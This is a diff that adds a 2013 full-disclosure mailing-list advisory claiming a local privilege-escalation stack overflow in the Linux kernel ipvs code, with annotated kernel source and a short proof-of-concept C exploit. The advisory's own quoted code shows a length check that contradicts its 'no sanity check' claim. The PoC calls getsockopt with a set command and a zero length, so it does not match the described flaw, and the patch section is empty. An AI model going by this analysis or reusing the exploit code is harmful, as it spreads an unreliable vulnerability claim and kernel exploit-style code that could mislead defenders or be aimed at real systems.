@@ -1,0 +1,192 @@
+
+Date: Mon, 11 Nov 2013 22:10:27 +0900
+From: x90c <geinblues@...il.com>
+To: full-disclosure@...ts.grok.org.uk
+Subject: XADV-2013004 Linux Kernel ipvs Kernel Stack
+	Overflow
+
++--------------------------------------------------------+
+| XADV-2013004 Linux Kernel ipvs Kernel Stack Overflow   |
++--------------------------------------------------------+
+
+ Vulnerable versions:
+ - linux kernel 2.6.32 <=
+
+ Not vulnerable versions:
+ - linux kernel 2.6.33 <=
+ - linux kernel 3.x
+
+ Testbed: linux kernel 2.6.18
+ Type: Local
+ Impact: Local Privilege Escalation
+ Vendor: http://www.kernel.org
+ Author: x90c <geinblues *nospam* gmail dot com>
+ Site: x90c.org
+
+
+=========
+ABSTRACT:
+=========
+
+The ipvs is:
+[Kconfig]
+----
+config  IP_VS
+    tristate "IP virtual server support (EXPERIMENTAL)"
+    depends on NETFILTER
+----
+
+Vulnerable source code is ~/linux-2.6.18/net/ipv4/ipvs/ip_vs_ctl.c.
+(If not there exists check the other netfilter directory.)
+The source code will be compiled in ipvs.ko.
+
+The ipvs function do_ip_vs_set_ctl() in the linux kernel has a kernel
+stack overflow vulnerability. It's Vulnerable to linux kernel 2.6.32 <=.
+
+It also can be allow to permit the CAP_NET_ADMIN to all CAPs via kernel
+stack overflow if exploited. The linux kernel vulnerability to lead to
+the local privilege escalation via the kernel stack overflow.
+
+Even though the need, NET_CAP_ADMIN capability, It's vulnerable!
+
+- References:
+  [1] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-6540
+  [2] http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=2d8a041
+      b7bfe1097af21441cb77d6af95f4f4680
+  [3] http://folk.uio.no/mathiasm/Stuff/keepalived-1.1.7/keepalived/libipvs-2.6/libipvs.c
+  [4] http://pubs.opengroup.org/onlinepubs/009695399/functions/getsockopt.html
+
+
+=========
+DETAILS:
+=========
+
+The do_ip_vs_set_ctl() in the ipvs is vulnerable function.
+It's vulnerable to the kernel stack overflow with no sanity check
+when copying the getsockopt socket option value from the userspace
+to the arg[] variable.
+
+The vulnerable arg stack buffer's size is 44 bytes!
+
+
+[linux-2.6.18/net/ipv4/ipvs/ip_vs_ctl.c]
+----
+
+#define SET_CMDID(cmd)      (cmd - IP_VS_BASE_CTL)
+#define SERVICE_ARG_LEN     (sizeof(struct ip_vs_service_user))
+#define SVCDEST_ARG_LEN     (sizeof(struct ip_vs_service_user)+    \ // XXX
+                 sizeof(struct ip_vs_dest_user))
+#define TIMEOUT_ARG_LEN     (sizeof(struct ip_vs_timeout_user))
+#define DAEMON_ARG_LEN      (sizeof(struct ip_vs_daemon_user))
+#define MAX_ARG_LEN     SVCDEST_ARG_LEN		// XXX 44 bytes.
+
+
+...
+
+
+static int
+do_ip_vs_set_ctl(struct sock *sk, int cmd, void __user *user, unsigned int len)
+{
+    int ret;
+    unsigned char arg[MAX_ARG_LEN]; /* XXX Vulnerable 44bytes stack: arg. */
+    struct ip_vs_service_user *usvc;
+    struct ip_vs_service *svc;
+    struct ip_vs_dest_user *udest;
+
+    if (!capable(CAP_NET_ADMIN)) /* XXX exp cond1) CAP_NET_ADMIN -> ALL CAP. */
+        return -EPERM;
+
+    if (len != set_arglen[SET_CMDID(cmd)]) {
+        IP_VS_ERR("set_ctl: len %u != %u\n",
+              len, set_arglen[SET_CMDID(cmd)]);
+        return -EINVAL;
+    }
+
+    /* XXX no sanity check. (kernel stack overflow) */
+    if (copy_from_user(arg, user, len) != 0)
+
+...
+
+    if (cmd == IP_VS_SO_SET_FLUSH) {	// XXX IP_VS_SO_SET_FLUSH.
+        /* Flush the virtual service */
+        ret = ip_vs_flush();
+        goto out_unlock;
+    } else if (cmd == IP_VS_SO_SET_TIMEOUT) { // XXX IP_VS_SO_SET_TIMEOUT ...
+        /* Set timeout values for (tcp tcpfin udp) */
+        ret = ip_vs_set_timeout((struct ip_vs_timeout_user *)arg);
+        goto out_unlock;
+    } else if (cmd == IP_VS_SO_SET_STARTDAEMON) {
+        struct ip_vs_daemon_user *dm = (struct ip_vs_daemon_user *)arg;
+        ret = start_sync_thread(dm->state, dm->mcast_ifn, dm->syncid);
+        goto out_unlock;
+    } else if (cmd == IP_VS_SO_SET_STOPDAEMON) {
+
+
+...
+
+
+static struct nf_sockopt_ops ip_vs_sockopts = {
+    .pf     = PF_INET,
+    .set_optmin = IP_VS_BASE_CTL,
+    .set_optmax = IP_VS_SO_SET_MAX+1,
+    .set        = do_ip_vs_set_ctl,	// XXX do_ip_vs_set_ctl!
+    .get_optmin = IP_VS_BASE_CTL,
+    .get_optmax = IP_VS_SO_GET_MAX+1,
+    .get        = do_ip_vs_get_ctl,
+};
+
+----
+
+===============
+EXPLOIT CODES:
+===============
+
+[ipvs_stack_overflow_poc.c]:
+----
+#include <stdio.h>
+#include <sys/socket.h>
+
+int main(){
+int sockfd = 0;
+socklen_t len = 0;
+char buff_overflow[128];
+
+memset(buff_overflow, 0x41, sizeof(buff_overflow));
+sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+/* Trigger (the buff_overflow variable is the socket option value)! */
+getsockopt(sockfd, IPPROTO_IP, IP_VS_SO_SET_TIMEOUT, buff_overflow, &len);
+
+}
+----
+
+=============
+PATCH CODES:
+=============
+-
+
+
+===============
+VENDOR STATUS:
+===============
+2013/11/11 - I discovered the linux kernel bug.
+2013/11/11 - The advisory released.
+
+
+============
+DISCLAIMER:
+============
+
+The authors reserve the right not to be responsible for the topicality,
+correctness, completeness or quality of the information provided in this
+document. Liability claims regarding damage caused by the use of any information
+provided, including any kind of information which is incomplete or incorrect,
+will therefore be rejected.
+
+Content of type "text/html" skipped
+
+View attachment "xadv_2013004_linux_kernel.txt" of type "text/plain" (5204 bytes)
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
